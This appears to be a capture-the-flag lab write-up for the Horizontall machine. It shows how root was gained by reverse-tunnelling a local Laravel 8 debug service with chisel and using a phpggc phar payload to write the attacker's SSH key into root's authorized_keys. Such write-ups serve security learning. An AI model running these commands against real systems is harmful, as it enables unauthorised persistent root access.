# Privilege Escalation to Root
## Found a port  running locally on port 8000
Found a port running locally on port 8000 via `linpeas.sh`. 
![[Pasted image 20210911154613.png]]
## Forwarded this port to kali VM via chisel 
 Forwarded this port to kali VM via chisel to see what service was running on this port. 
 Used `./chisel server -p 8001 -reverse -v` on kali VM and `./chisel client 10.10.14.98:8001 R:127.0.0.1:8000:127.0.0.1:8000` on victim machine.
 ## Found that PHP Laravel version 8 was running on this port
 It turned out that PHP laravel version 8 was running on this port.
![[Pasted image 20210911155004.png]]
![[Pasted image 20210911155346.png]]
## Found that PHP Laravel is running in DEBUG mode
Found that PHP Laravel is running in DEBUG mode.
![[Pasted image 20210911160123.png]]
## Found exploit for PHP Laravel Version 8 DEBUG mode
Found exploit for PHP Laravel Version 8 DEBUG mode on [Github](https://github.com/ambionics/laravel-exploits) . This exploit was explained on [Ambionics security website](https://www.ambionics.io/blog/laravel-debug-rce).
## Executing this exploit
### phpggc library was required to run this exploit
Downloaded phpggc library from their [gitub repository](https://github.com/ambionics/phpggc.git)
### Downloaded this exploit from [github](https://github.com/ambionics/laravel-exploits)
Downloaded this exploit from [github](https://github.com/ambionics/laravel-exploits) .
### First made exploit.phar file via phpggc as payload
First made exploit.phar file via phpggc which contained our payload that will execute as root on victim machine
```bash
~/Dropbox/Documents/htb/boxes/horizontall/phpggc master* ❯ php -d\'phar.readonly=0\' ./phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/mwm452HoYqTenuKZfoWk/GzXPOU7PHemPETWNWQw8mSBcy52PYGqqMYJ+L0Rj3F1xO/iVDw8w0kd6fcROiY6A2YpWAN/lqiUDlR/w3WREZj27Bp8G+FIm9fqNJqIV7y+gSpZUkgohqvb+z0iSWTT2k8bw9Ey7xKM35UMequdEUIyQpVG8/U75heBKkgk78k0inGBQ22ZBNcEsl0+CsCmtqJR3tkkcCLWaPnpsh5VWalwG3qMfU0b0fweTUC+yWr0PPad0mIc0qXsflSw6pD6WWDKnv0aLLToFMkTQymta5dV2kRbWQILlaWoNjuKd/btzek+VF53r/y1pZvkqlD/CJFtaWRtJ4ftVX1RFo8d1iSjMNEqpSt4hhhsJllLU2vivCBI+qpv6ziviLKBzUCSr+s5DAJ6Gcw7CUFy167utJHhx0AN1ePTq/szTNH2QdZ0qrZixx6KIBKWpoqaBSu9x5sw28J0ciEOuB8dU/YjGdk2cF+BxiJcCjAyaAztTVk= kali@kali" > /root/.ssh/authorized_keys'
```
```bash
~/Dropbox/Documents/htb/boxes/horizontall/phpggc master* ❯ ls /tmp
 burp353661255340077323.tmp                                                                           systemd-private-ca289873af84461b8225a4c11f2a63b2-colord.service-cE3zkj
 burp539083475885844449.tmp                                                                           systemd-private-ca289873af84461b8225a4c11f2a63b2-haveged.service-oobCNf
 dbus-vmeUlX1O1C                                                                                      systemd-private-ca289873af84461b8225a4c11f2a63b2-ModemManager.service-4aWsRh
 exploit.phar                                                                                         systemd-private-ca289873af84461b8225a4c11f2a63b2-systemd-logind.service-pZHePg
 hsperfdata_kali                                                                                      systemd-private-ca289873af84461b8225a4c11f2a63b2-upower.service-b9H1sh
 i4j_log17904755029559460478.log                                                                      Temp-83d9e978-e71f-400d-86db-b50da6048709
'jqyW4DG_KozucWjxPg+GJipwtfmYsEbyNCXQikmRRFs='                                                        Temp-d6993306-fb34-4565-a876-299e46e16461
 qipc_sharedmemory_jqyWDGKozucWjxPgGJipwtfmYsEbyNCXQikmRRFsea2783f64d9c3b2c0c35ef99df411decee32d9b3   tmux-1000
 qipc_systemsem_jqyWDGKozucWjxPgGJipwtfmYsEbyNCXQikmRRFsea2783f64d9c3b2c0c35ef99df411decee32d9b3      vmware-root
 ssh-RDIjbLSZp9NO
~/Dropbox/Documents/htb/boxes/horizontall/phpggc master* ❯
```
![[Pasted image 20210911162312.png]]
Our payload/command consisted of copying Kali VM public key to authorized_keys in /root/.ssh/ directory.
### Ran exploit on Kali VM as port was forwarded on kali VM 
Ran exploit on Kali VM as port was forwarded on kali VM and command/payload will execute on victim machine. Execution of payload on victim machine was succeeded.
![[Pasted image 20210911162631.png]]
### Ssh logged in as root 
As Kali VM public was copied in /root/.ssh/authorized_keys file, so we can ssh login as root on victim machine.
![[Pasted image 20210911162934.png]]








